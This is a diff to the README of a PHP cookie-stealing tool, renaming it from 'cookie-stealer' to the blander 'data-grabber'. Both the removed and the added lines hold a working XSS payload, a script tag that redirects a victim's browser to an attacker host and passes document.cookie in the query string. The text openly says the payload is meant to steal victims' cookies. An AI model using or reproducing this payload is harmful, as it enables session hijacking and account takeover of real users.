@@ -1,5 +1,5 @@
-# cookie-stealer
-Cookie Stealer in PHP
+# data-grabber
+web data grabber in PHP
 
 ## usage
 #### step1 - start web server on your own web server
@@ -22,7 +22,7 @@ http://192.168.1.135/p1.php?txt=your-data
 #### Payload
 here is some payload for vulnerabilities like XSS to steal cookies of your victim:
 ```
-<script>window.location="http://192.168.1.135/php-cookie-stealer/p1.php?txt="+document.cookie</script>
+<script>window.location="http://192.168.1.135/wdata-grabber/p1.php?txt="+document.cookie</script>
 ```
 
 ### p1.php
